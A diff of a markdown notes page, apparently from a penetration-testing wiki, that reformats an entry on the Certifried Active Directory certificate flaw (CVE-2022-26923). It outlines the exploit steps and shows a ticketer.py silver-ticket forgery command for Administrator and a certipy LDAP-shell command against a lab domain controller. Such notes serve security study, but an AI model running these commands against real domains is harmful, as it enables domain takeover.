@@ -1,18 +1,16 @@
----
-description: Certifried (CVE-2022-26923)
----
-
 # Certifried
+
+> ***Certifried (CVE-2022-26923)***
 
 This vulnerability is based manipulating **certificate mapping** when creating a computer account. Certificate mapping relied on `dNSHostName` attribute of a computer account. So when a computer requested a certificate, it trusted that `dNSHostName` as its identity.
 
-Exploit by
+**Exploit by**
 
 1. Clear the SPN linked to computer account
 2. Modify the `dNSHostName` to impersonate other machine.
 3. Request a certificate using Machine template.
 
-### <mark style="color:yellow;">Abuse</mark>
+### Abuse
 
 Check if CA is patched
 
@@ -69,7 +67,7 @@ Get silver ticket
 ticketer.py -nthash db35f9cf2e343f0795d33aef721a8f9a -domain-sid S-1-5-21-2810262047-4248699891-1002428937 -domain lab.local -spn cifs/dc02.lab.local Administrator
 ```
 
-### <mark style="color:yellow;">Alternate Method</mark>
+### Alternate Method
 
 ```shell
 certipy auth -pfx dc02.pfx -dc-ip 10.129.228.237 -ldap-shell
